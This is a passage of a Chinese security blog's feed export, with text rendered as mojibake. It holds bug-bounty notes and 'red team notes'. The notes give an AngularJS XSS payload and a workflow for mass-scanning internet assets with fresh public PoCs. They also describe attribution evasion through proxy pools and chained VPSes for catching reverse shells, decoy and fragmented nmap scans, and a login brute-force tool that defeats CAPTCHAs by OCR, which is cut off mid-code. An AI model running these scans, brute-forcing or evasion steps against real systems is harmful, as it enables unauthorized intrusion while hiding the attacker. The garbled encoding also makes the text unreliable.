<li>è€Œimgæ ‡ç­¾è¢«å®ä¾‹åŒ–æˆDOMèŠ‚ç‚¹ä¹‹åï¼Œjsä»£ç æ˜¯é€šè¿‡onerrorè¿™ä¸ªäº‹ä»¶å¤„ç†å™¨è¿›è¡Œæ‰§è¡Œçš„ï¼Œå³ä¸€æ—¦å®ä¾‹åŒ–å³åˆ»ç”Ÿæ•ˆã€‚è¿™ç§æ ‡ç­¾å’Œå±æ€§è¿˜æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚&lt;svg onload&gt;ã€&lt;iframe onload&gt;â€¦â€¦</li>
</ul>
</li>
</ol>
<h3 id="DOM-AngularJS"><a href="#DOM-AngularJS" class="headerlink" title="DOM-AngularJS"></a>DOM-AngularJS</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. AngularJsæ˜¯ä¸€ä¸ªå‰ç«¯æ¡†æ¶ï¼Œæ”¯æŒ`&#123;&#123;&#125;&#125;`æ¨¡æ¿è¡¨è¾¾å¼è¯­æ³•ï¼›</span><br><span class="line">2. AngularJSä¼šæ‰«æ`ng-app`å…ƒç´ ä¸‹çš„å†…å®¹ï¼Œå¦‚æœé‡åˆ°äº†`&#123;&#123;&#125;&#125;`ï¼Œå°±ä¼šå½“æˆæ¨¡æ¿è¡¨è¾¾å¼è¿›è¡Œæ‰§è¡Œï¼›</span><br><span class="line">3. ç”±äºæ¡†æ¶çš„å®‰å…¨æœºåˆ¶é™åˆ¶ï¼Œæ²¡æœ‰åŠæ³•ç›´æ¥æ”¯æŒ&lt;script&gt;æ ‡ç­¾ä»¥åŠjså‡½æ•°ã€‚ç»è¿‡ç»•è¿‡ä¹‹åï¼Œpayloadä¸€èˆ¬ä¸ºï¼š&#123;&#123;$on.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">4. é¶åœºï¼šhttps://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression</span><br><span class="line">5. Solutionï¼šhttps://blog.csdn.net/m0_65361643/article/details/151396393</span><br></pre></td></tr></table></figure>

<h1 id="èµ„äº§æµ‹ç»˜"><a href="#èµ„äº§æµ‹ç»˜" class="headerlink" title="èµ„äº§æµ‹ç»˜"></a>èµ„äº§æµ‹ç»˜</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url: fofa.icu  fofa.info</span><br><span class="line">query: country=&quot;CN&quot; &amp;&amp; (host=&quot;.com&quot; || host=&quot;.cn&quot;) &amp;&amp; </span><br></pre></td></tr></table></figure>

<h1 id="ä¼ä¸šèƒŒè°ƒ"><a href="#ä¼ä¸šèƒŒè°ƒ" class="headerlink" title="ä¼ä¸šèƒŒè°ƒ"></a>ä¼ä¸šèƒŒè°ƒ</h1><ol>
<li>ä¼æŸ¥æŸ¥ï¼š<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
<li>çˆ±ä¼æŸ¥ï¼š<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></li>
<li>SEOæƒé‡ï¼š<a href="https://github.com/Potato-py/ipInfoSearch">https://github.com/Potato-py/ipInfoSearch</a></li>
</ol>
<h1 id="SRCå¹³å°"><a href="#SRCå¹³å°" class="headerlink" title="SRCå¹³å°"></a>SRCå¹³å°</h1><ol>
<li>æƒé‡ä¸º0ï¼šæ¼æ´ç›’å­-å…¬ç›ŠSRC</li>
<li>æœ‰æƒé‡ï¼šè¡¥å¤©</li>
<li>edu.cnï¼šæ•™è‚²SRC</li>
<li>å¤§å‚ï¼šä¸“å±SRC</li>
</ol>
<h1 id="å¿«é€Ÿå‡ºæ´"><a href="#å¿«é€Ÿå‡ºæ´" class="headerlink" title="å¿«é€Ÿå‡ºæ´"></a>å¿«é€Ÿå‡ºæ´</h1><h3 id="é€šè¿‡Ndayæ‰¾ç›®æ ‡"><a href="#é€šè¿‡Ndayæ‰¾ç›®æ ‡" class="headerlink" title="é€šè¿‡Ndayæ‰¾ç›®æ ‡"></a>é€šè¿‡Ndayæ‰¾ç›®æ ‡</h3><p>åœ¨nuclei pocçš„æ”¶é›†å¹³å°ä¸Š<a href="https://github.com/adysec/nuclei_poc%E4%BB%A5%E6%97%B6%E9%97%B4%E9%A1%BA%E5%BA%8F%E5%80%92%E6%8E%A8%E6%89%BE%E6%9C%80%E6%96%B0%E7%9A%84poc">https://github.com/adysec/nuclei_pocä»¥æ—¶é—´é¡ºåºå€’æ¨æ‰¾æœ€æ–°çš„poc</a>  &#x3D;&#x3D;&gt;  ç„¶åé€šè¿‡FOFAåŒ¹é…èµ„äº§  &#x3D;&#x3D;&gt;  VPSæ‰¹é‡æ¼æ´+äº‘ç«¯ä¸Šä¼   &#x3D;&#x3D;&gt;  å¯¼å‡ºç»“æœ+ipinfoSearchæ‰¹é‡æŸ¥æƒé‡  &#x3D;&#x3D;&gt;  ä¼æŸ¥æŸ¥&#x2F;çˆ±ä¼æŸ¥åšèƒŒè°ƒ  &#x3D;&#x3D;&gt;  æœ‰æƒé‡äº¤è¡¥å¤©ï¼Œæ²¡æƒé‡äº¤ç›’å­  &#x3D;&#x3D;&gt;  å¦‚æœæç¤ºæ¼æ´æ ‡é¢˜å­˜åœ¨ï¼ŒåŠ ä¸Šä¸€äº›ç‰¹æ®Šç¬¦å·è¿›è¡Œç»•è¿‡ã€‚</p>
<ol>
<li>URLæ ¼å¼å¤„ç†ï¼š<a href="http://tools.sbbbb.cn/url-ip/">URL &amp; IP åœ¨çº¿å¤„ç†å·¥å…·</a></li>
</ol>
<h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><ol>
<li>å¤§å‚è¾¹ç¼˜èµ„äº§ã€éé‡‘è</li>
<li>æ¼æ´å¤„ç½®è§„åˆ™</li>
</ol>
<h1 id="Day01-å­—èŠ‚SRC"><a href="#Day01-å­—èŠ‚SRC" class="headerlink" title="Day01-å­—èŠ‚SRC"></a>Day01-å­—èŠ‚SRC</h1><blockquote>
<ol>
<li>SRCä¸å¼ºæ±‚æ¼æ´åˆ©ç”¨ï¼Œåªè¦æ˜¯æ¼æ´å°±å¯ä»¥ã€‚å½“ç„¶ï¼Œèƒ½å¤Ÿåˆ©ç”¨é€ æˆæ›´å¤§çš„å±å®³è‚¯å®šæ˜¯æ›´å¥½</li>
<li>SRCä¸­å¸¸è§æ¼æ´ï¼šDOM-XSSã€SSRFã€é€»è¾‘æ¼æ´ã€æœªæˆæƒè®¿é—®</li>
</ol>
</blockquote>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><ol>
<li><p>èµ„äº§æ‰©å……â€”â€”å¤šä¸ªç½‘ç»œç©ºé—´æœç´¢å¼•æ“è”åˆæœç´¢ï¼šä¸»åŸŸåã€faviconã€ç›¸åŒè¯ä¹¦ã€Cæ®µ</p>
</li>
<li><p>å­åŸŸåæå–è„šæœ¬</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_subdomains</span>(<span class="params">file_path, target_domain, include_main=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ä»æ–‡ä»¶ä¸­æå–æŒ‡å®šåŸŸåä¸‹çš„å­åŸŸå</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    å‚æ•°:</span></span><br><span class="line"><span class="string">        file_path: åŒ…å«URLçš„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="string">        target_domain: ç›®æ ‡ä¸»åŸŸå(å¦‚example.com)</span></span><br><span class="line"><span class="string">        include_main: æ˜¯å¦åŒ…å«ä¸»åŸŸåæœ¬èº«</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    è¿”å›:</span></span><br><span class="line"><span class="string">        å»é‡åçš„å­åŸŸååˆ—è¡¨</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># ç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºåŒ¹é…ç›®æ ‡åŸŸååŠå…¶å­åŸŸå</span></span><br><span class="line">    <span class="comment"># æ”¯æŒå¸¦ç«¯å£ã€è·¯å¾„ç­‰æƒ…å†µ</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(</span><br><span class="line">        <span class="string">r&#x27;(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]&#123;0,61&#125;[a-zA-Z0-9])?\.)*?&#x27;</span> + </span><br><span class="line">        re.escape(target_domain) + </span><br><span class="line">        <span class="string">r&#x27;(?::\d+)?(?:/.*)?$&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    subdomains = <span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                line = line.strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å°è¯•ä½¿ç”¨urlparseè§£æ</span></span><br><span class="line">                parsed = urlparse(line)</span><br><span class="line">                <span class="keyword">if</span> parsed.netloc:  <span class="comment"># æœ‰ç½‘ç»œä½ç½®éƒ¨åˆ†</span></span><br><span class="line">                    domain = parsed.netloc</span><br><span class="line">                    <span class="comment"># å»é™¤ç«¯å£</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> domain:</span><br><span class="line">                        domain = domain.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># æ²¡æœ‰åè®®éƒ¨åˆ†ï¼Œç›´æ¥å¤„ç†</span></span><br><span class="line">                    domain = line.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># æ£€æŸ¥æ˜¯å¦åŒ¹é…ç›®æ ‡åŸŸå</span></span><br><span class="line">                <span class="keyword">if</span> pattern.<span class="keyword">match</span>(domain):</span><br><span class="line">                    <span class="comment"># æå–å®Œæ•´åŸŸå(åŒ…å«å­åŸŸå)</span></span><br><span class="line">                    full_domain = domain</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># ç¡®ä¿ä¸åŒ…å«ç«¯å£ä¿¡æ¯</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> full_domain:</span><br><span class="line">                        full_domain = full_domain.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># æ£€æŸ¥æ˜¯å¦ä¸ºä¸»åŸŸåæœ¬èº«</span></span><br><span class="line">                    <span class="keyword">if</span> full_domain == target_domain:</span><br><span class="line">                        <span class="keyword">if</span> include_main:</span><br><span class="line">                            subdomains.add(full_domain)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># ç¡®è®¤æ˜¯ç›®æ ‡åŸŸåçš„å­åŸŸå</span></span><br><span class="line">                        <span class="keyword">if</span> full_domain.endswith(<span class="string">&#x27;.&#x27;</span> + target_domain):</span><br><span class="line">                            subdomains.add(full_domain)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;é”™è¯¯: æ–‡ä»¶ &#x27;<span class="subst">&#123;file_path&#125;</span>&#x27; ä¸å­˜åœ¨&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¤„ç†æ–‡ä»¶æ—¶å‡ºé”™: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æŒ‰é•¿åº¦æ’åºï¼Œä¾¿äºé˜…è¯»</span></span><br><span class="line">    sorted_subdomains = <span class="built_in">sorted</span>(subdomains, key=<span class="keyword">lambda</span> x: (<span class="built_in">len</span>(x.split(<span class="string">&#x27;.&#x27;</span>)), x))</span><br><span class="line">    <span class="keyword">return</span> sorted_subdomains</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;æå–æŒ‡å®šåŸŸåä¸‹çš„å­åŸŸå&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;åŒ…å«URLçš„æ–‡ä»¶è·¯å¾„&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;domain&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;ç›®æ ‡ä¸»åŸŸå(å¦‚example.com)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--include-main&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&#x27;æ˜¯å¦åŒ…å«ä¸»åŸŸåæœ¬èº«&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;è¾“å‡ºç»“æœåˆ°æ–‡ä»¶&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æ­£åœ¨ä» <span class="subst">&#123;args.file&#125;</span> ä¸­æå– <span class="subst">&#123;args.domain&#125;</span> çš„å­åŸŸå...&quot;</span>)</span><br><span class="line">    subdomains = extract_subdomains(args.file, args.domain, args.include_main)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> subdomains:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nå…±æ‰¾åˆ° <span class="subst">&#123;<span class="built_in">len</span>(subdomains)&#125;</span> ä¸ªç‹¬ç‰¹çš„å­åŸŸå:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">            <span class="built_in">print</span>(subdomain)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> args.output:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">                    f.write(subdomain + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\nç»“æœå·²ä¿å­˜åˆ° <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\næœªæ‰¾åˆ° <span class="subst">&#123;args.domain&#125;</span> çš„å­åŸŸå&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>SRC</category>
      </categories>
      <tags>
        <tag>SRCæŒ–æ˜æ€è·¯</tag>
      </tags>
  </entry>
  <entry>
    <title>çº¢é˜Ÿç¬”è®°</title>
    <url>/RedteamNotes.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="åæº¯æº"><a href="#åæº¯æº" class="headerlink" title="åæº¯æº"></a>åæº¯æº</h2><ol>
<li><p>ç½‘ç»œéš”ç¦»ï¼š</p>
<ul>
<li><p>ç³»ç»Ÿä»£ç†ï¼šClashVerge&#x2F;V2rayN + æœºåœºèŠ‚ç‚¹</p>
</li>
<li><p>ä»£ç†æ± ï¼šçˆ†ç ´çš„æ—¶å€™ï¼Œé€‰æ‹©ä»£ç†æ± ï¼Œé¿å…å•ä¸ªèŠ‚ç‚¹è¢«å°</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[proxifly|æ¯5minè·å–å…¨çƒå…è´¹èŠ‚ç‚¹]: https://github.com/proxifly/free-proxy-list/blob/main/proxies/all/data.txt</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>ç¯å¢ƒéš”ç¦»ï¼šåœ¨è™šæ‹Ÿæœºé‡Œé¢æ­å»ºæ”»å‡»æœº&#x2F;ä¹°ä¸€å°æ–°æœºå™¨ä¸“é—¨ç”¨æ¥åšæ”»å‡»æœºï¼Œæ”»å‡»æœºä¸å…è®¸å’Œä¸ªäººç”¨æœºæœ‰ç›´æ¥äº¤äº’ã€‚æ€ä¹ˆäº¤æ¢ä¿¡æ¯ï¼šæ”»å‡»æœº(åŠ å¯†æ•°æ®&#x2F;è§£å¯†æ•°æ®) &lt;-&gt; vps(å¯ä»¥æ­ä¸ªæœåŠ¡) &lt;-&gt; PC+ä»£ç†(åŠ å¯†æ•°æ®&#x2F;è§£å¯†æ•°æ®)</p>
</li>
<li><p>æ•°æ®éš”ç¦»ï¼šæ”»å‡»æœºä¸Šé¢ä¸è¦å‡ºç°ä»»ä½•ä¸ªäººæ•°æ®ï¼Œä¸€å¾‹ä¸å‡†ä½¿ç”¨å›½å†…è½¯ä»¶èŠå¤©è½¯ä»¶ï¼Œä½¿ç”¨éªŒè¯ç &#x2F;éšæœºå¯†ç è¿›è¡Œç™»å½•ï¼Œä½¿ç”¨æµ‹è¯•è´¦å·</p>
</li>
<li><p>æ¥æ”¶æ•°æ®ï¼ˆåå¼¹shell&#x2F;å¤–å¸¦æ•°æ®ï¼‰ï¼šåœ¨VPSä¸Šæ¥æ”¶ï¼Œæ”»å‡»æœº+ç³»ç»Ÿä»£ç† -&gt; VPS1 -&gt; â€¦â€¦ -&gt; çˆ†ç ´æœº</p>
</li>
<li><p>VPSï¼šä½¿ç”¨sshå¯†é’¥è¿›è¡Œç™»é™†ï¼Œä¸¥ç¦ä½¿ç”¨å¯†ç </p>
</li>
</ol>
<h1 id="WEBæ‰“ç‚¹"><a href="#WEBæ‰“ç‚¹" class="headerlink" title="WEBæ‰“ç‚¹"></a>WEBæ‰“ç‚¹</h1><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><blockquote>
<p>nmapæ‰«å­˜æ´»ä¸»æœº -&gt; masscan&#x2F;fscanæ‰«ç«¯å£ -&gt; nmapæ‰«æœåŠ¡ç‰ˆæœ¬</p>
</blockquote>
<ol>
<li><p>masscan</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.108.13 --rate 200 --source-ip 192.168.101.2 --source-port 40000-40007 --ttl 64 --wait 2 --randomize-hosts --randomize-ports &gt;&gt; 192_168_108_13_ports.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>fscan</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fscan -h 192.168.108.0/24 &gt;&gt; 192_168_108_0_fscan.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>nmap</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.108.0/24 &gt;&gt; 192_168_108_0_nmap.txt</span><br><span class="line">nmap 192.168.108.13 -p139,49172,445,135,49268,3389,49160,49154,49152,60966,80 -sV -sS -D RND:10 -mtu 8 &gt;&gt; 192_168_108_13_nmap.txt</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="çˆ†ç ´ç™»å½•é¡µ"><a href="#çˆ†ç ´ç™»å½•é¡µ" class="headerlink" title="çˆ†ç ´ç™»å½•é¡µ"></a>çˆ†ç ´ç™»å½•é¡µ</h2><ol>
<li><p>basic-authorize: hydra</p>
</li>
<li><p>æ•°æ®åŒ…æ²¡æœ‰åŠ å¯†ï¼šburpsuite</p>
</li>
<li><p>æ•°æ®åŒ…æœ‰åŠ å¯†ï¼šçˆ¬è™«</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Webç™»å½•çˆ†ç ´å·¥å…·</span></span><br><span class="line"><span class="string">ä½¿ç”¨Playwrightè‡ªåŠ¨åŒ–æµè§ˆå™¨è¿›è¡Œç™»å½•çˆ†ç ´</span></span><br><span class="line"><span class="string">æ ¹æ®è¿”å›çš„é•¿åº¦è¿›è¡Œåˆ¤æ–­</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Tuple</span>, <span class="type">Optional</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> playwright.async_api <span class="keyword">import</span> async_playwright, Browser, BrowserContext, Page</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomHelpFormatter</span>(argparse.HelpFormatter):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_format_action_invocation</span>(<span class="params">self, action</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> action.option_strings:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>()._format_action_invocation(action)</span><br><span class="line">        default = <span class="variable language_">self</span>._get_default_metavar_for_optional(action)</span><br><span class="line">        args_string = <span class="variable language_">self</span>._format_args(action, default)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span>.join(action.option_strings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoginBruster</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, </span></span><br><span class="line"><span class="params">                 target_url: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 username_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 password_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 captcha_img_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 captcha_input_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 login_button_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 max_threads: <span class="built_in">int</span> = <span class="number">5</span>,</span></span><br><span class="line"><span class="params">                 success_url_contains: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                 success_text_contains: <span class="built_in">str</span> = <span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        åˆå§‹åŒ–ç™»å½•çˆ†ç ´å™¨</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            target_url: ç›®æ ‡URL</span></span><br><span class="line"><span class="string">            username_xpath: ç”¨æˆ·åè¾“å…¥æ¡†XPath</span></span><br><span class="line"><span class="string">            password_xpath: å¯†ç è¾“å…¥æ¡†XPath</span></span><br><span class="line"><span class="string">            captcha_img_xpath: éªŒè¯ç å›¾ç‰‡XPath</span></span><br><span class="line"><span class="string">            captcha_input_xpath: éªŒè¯ç è¾“å…¥æ¡†XPath</span></span><br><span class="line"><span class="string">            login_button_xpath: ç™»å½•æŒ‰é’®XPath</span></span><br><span class="line"><span class="string">            max_threads: æœ€å¤§çº¿ç¨‹æ•°</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.target_url = target_url</span><br><span class="line">        <span class="variable language_">self</span>.username_xpath = username_xpath</span><br><span class="line">        <span class="variable language_">self</span>.password_xpath = password_xpath</span><br><span class="line">        <span class="variable language_">self</span>.captcha_img_xpath = captcha_img_xpath</span><br><span class="line">        <span class="variable language_">self</span>.captcha_input_xpath = captcha_input_xpath</span><br><span class="line">        <span class="variable language_">self</span>.login_button_xpath = login_button_xpath</span><br><span class="line">        <span class="variable language_">self</span>.max_threads = max_threads</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.results = []</span><br><span class="line">        <span class="variable language_">self</span>.lock = threading.Lock()</span><br><span class="line">        <span class="variable language_">self</span>.success_count = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.failed_count = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_wordlist</span>(<span class="params">self, file_path: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;åŠ è½½å­—å…¸æ–‡ä»¶&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">return</span> [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;é”™è¯¯ï¼šæ‰¾ä¸åˆ°æ–‡ä»¶ <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;åŠ è½½æ–‡ä»¶ <span class="subst">&#123;file_path&#125;</span> æ—¶å‡ºé”™ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">preprocess_captcha</span>(<span class="params">self, image_data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        é¢„å¤„ç†éªŒè¯ç å›¾ç‰‡å¹¶è¯†åˆ«</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            image_data: å›¾ç‰‡æ•°æ®</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            è¯†åˆ«å‡ºçš„éªŒè¯ç æ–‡æœ¬</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># ä½¿ç”¨ddddocrè¿›è¡ŒéªŒè¯ç è¯†åˆ«</span></span><br><span class="line">            ocr = ddddocr.DdddOcr(show_ad=<span class="literal">False</span>)</span><br><span class="line">            text = ocr.classification(image_data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;éªŒè¯ç è¯†åˆ«ç»“æœ: <span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> text.strip()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;éªŒè¯ç 